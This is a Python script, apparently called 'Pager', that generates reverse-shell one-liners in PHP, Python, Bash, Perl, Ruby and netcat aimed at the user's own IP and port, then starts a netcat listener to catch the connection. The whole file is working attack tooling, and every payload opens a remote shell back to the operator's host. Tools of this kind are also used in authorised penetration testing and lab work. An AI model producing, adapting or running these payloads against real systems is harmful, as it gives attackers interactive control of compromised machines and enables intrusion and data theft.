import os
import subprocess
import argparse
import socket
import pyfiglet
import platform

def cycle_colors(text):
    colors = ['\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m']  # Red, Green, Yellow, Blue, Magenta, Cyan
    colored_text = ''
    for char in text:
        colored_text += colors[len(colored_text) % len(colors)] + char
    colored_text += '\033[0m'  
    return colored_text

def display_banner():
    banner_text = "Pager"
    banner = pyfiglet.figlet_format(banner_text, font="slant")
    colored_banner = cycle_colors(banner)
    print(colored_banner)

def get_local_ip():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        try:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
        except Exception as e:
            print(f"Error getting local IP address: {e}")
            local_ip = "127.0.0.1"
    return local_ip

def generate_payload(payload_type, ip, port):
    payloads = {
        "php": f"<?php shell_exec('bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"'); ?>",
        "python": f"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);",
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "netcat": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    }
    return payloads.get(payload_type.lower(), "Invalid payload type")

def start_nc_listener(port):
    nc_command = ["nc", "-lvn", str(port)]
    if platform.system() == "Linux":
        nc_command = ["nc", "-lnv", str(port)]

    try:
        # Change color to yellow for the netcat listening message
        print(f"\033[33mStarting netcat listener on port {port}...\033[0m")
        subprocess.call(nc_command)
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    display_banner()

    parser = argparse.ArgumentParser(description="Payload Generator and Netcat Listener")
    parser.add_argument("payload_type", choices=["php", "python", "bash", "perl", "ruby", "netcat"], help="Type of payload")
    parser.add_argument("port", type=int, help="Port number for the payload to connect to and for the netcat listener")

    args = parser.parse_args()

    local_ip = get_local_ip()
    payload = generate_payload(args.payload_type, local_ip, args.port)

    if payload == "Invalid payload type":
        print(payload)
    else:
        # Change color to green for the payload message
        print(f"\033[32mGenerated {args.payload_type} payload:\n{payload}\033[0m\n")
        start_nc_listener(args.port)

if __name__ == "__main__":
    main()
